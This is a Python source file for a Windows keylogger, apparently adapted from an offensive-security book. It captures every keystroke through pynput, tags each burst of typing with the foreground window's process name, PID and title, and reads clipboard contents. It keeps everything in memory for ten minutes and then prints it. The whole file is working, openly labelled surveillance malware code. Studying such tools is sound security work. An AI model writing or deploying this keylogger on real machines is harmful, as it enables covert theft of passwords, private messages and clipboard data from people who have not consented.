"""
Requirements:
    pip install pynput
    pip install pywin32

"""

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO
from pynput import keyboard

import sys
import time
import win32clipboard


TIMEOUT = 60 * 10  # runs for 10 minutes (same as book)


class KeyLogger:
    def __init__(self):
        self.current_window = None
        self.log = StringIO()  # stores all keystrokes in memory

    def get_current_process(self):
        """
        Gets the currently active window's:
        - Process ID
        - Executable name (e.g., firefox.exe)
        - Window title (e.g., Gmail - Mozilla Firefox)
        """
        # Get handle to the active window
        hwnd = windll.user32.GetForegroundWindow()

        # Get the Process ID from the window handle
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))

        # Prepare buffers
        executable = create_string_buffer(512)
        window_title = create_string_buffer(512)

        # Open the process with minimal read/query rights
        PROCESS_QUERY_INFORMATION = 0x0400
        PROCESS_VM_READ = 0x0010
        h_process = windll.kernel32.OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid.value
        )

        # Try to read the process name into the buffer
        if h_process:
            try:
                windll.psapi.GetModuleBaseNameA(h_process, None, executable, 512)
                proc_name = executable.value.decode(errors='ignore').rstrip('\x00')
            except Exception:
                proc_name = 'unknown'
        else:
            proc_name = 'unknown'

        # Get the window title text
        try:
            windll.user32.GetWindowTextA(hwnd, window_title, 512)
            self.current_window = window_title.value.decode(errors='ignore').rstrip('\x00')
        except Exception:
            self.current_window = 'unknown'

        # Log a clean header showing where keystrokes are coming from
        header = (
            f'\n\n[WINDOW] PID: {pid.value} | '
            f'Process: {proc_name} | '
            f'Title: {self.current_window}\n'
        )
        self.log.write(header)
        print(header, end='')

        # Clean up process handle if opened
        if h_process:
            try:
                windll.kernel32.CloseHandle(h_process)
            except Exception:
                pass

    def check_window_change(self):
        """Check if the user switched to a different window."""
        current = create_string_buffer(512)
        hwnd = windll.user32.GetForegroundWindow()
        try:
            windll.user32.GetWindowTextA(hwnd, current, 512)
            current_title = current.value.decode(errors='ignore').rstrip('\x00')
        except Exception:
            current_title = 'unknown'

        if current_title != self.current_window:
            self.get_current_process()

    def on_press(self, key):
        """
        Called automatically every time a key is pressed.
        This is the pynput equivalent of PyWinHook's mykeystroke callback.
        """
        # Check if user switched windows
        self.check_window_change()

        try:
            # Regular printable character (a, b, 1, !, etc.)
            char = key.char
            if char is not None:
                self.log.write(char)
                print(char, end='', flush=True)

        except AttributeError:
            # Special key pressed (Enter, Shift, Ctrl, etc.)
            if key == keyboard.Key.enter:
                self.log.write('\n[ENTER]\n')
                print('\n[ENTER]')
            elif key == keyboard.Key.space:
                self.log.write(' ')
                print(' ', end='', flush=True)
            elif key == keyboard.Key.backspace:
                self.log.write('[BACKSPACE]')
                print('[BACKSPACE]', end='', flush=True)
            elif key == keyboard.Key.tab:
                self.log.write('[TAB]')
                print('[TAB]', end='', flush=True)
            else:
                # Any other special key like Shift, Alt, F1, etc.
                special = str(key).replace("Key.", "").upper()
                formatted = f'[{special}]'
                self.log.write(formatted)
                print(formatted, end='', flush=True)

    def get_clipboard(self):
        """Reads and returns current clipboard content."""
        opened = False
        try:
            win32clipboard.OpenClipboard()
            opened = True
            try:
                value = win32clipboard.GetClipboardData()
            except Exception:
                value = ''
            return value
        except Exception:
            return ''
        finally:
            if opened:
                try:
                    win32clipboard.CloseClipboard()
                except Exception:
                    pass


def run():
    kl = KeyLogger()

    # Log the starting active window
    kl.get_current_process()

    # Start keyboard listener in background thread
    listener = keyboard.Listener(on_press=kl.on_press)
    listener.start()

    print(f'[*] Keylogger started. Running for {TIMEOUT // 60} minutes...\n')

    # Keep running until TIMEOUT is reached
    start_time = time.time()
    while time.time() - start_time < TIMEOUT:
        time.sleep(0.1)

    # Stop capturing
    listener.stop()

    # Return everything that was logged
    return kl.log.getvalue()


if __name__ == '__main__':
    log = run()
    print('\n\n--- CAPTURED LOG ---')
    print(log)
    print('done.')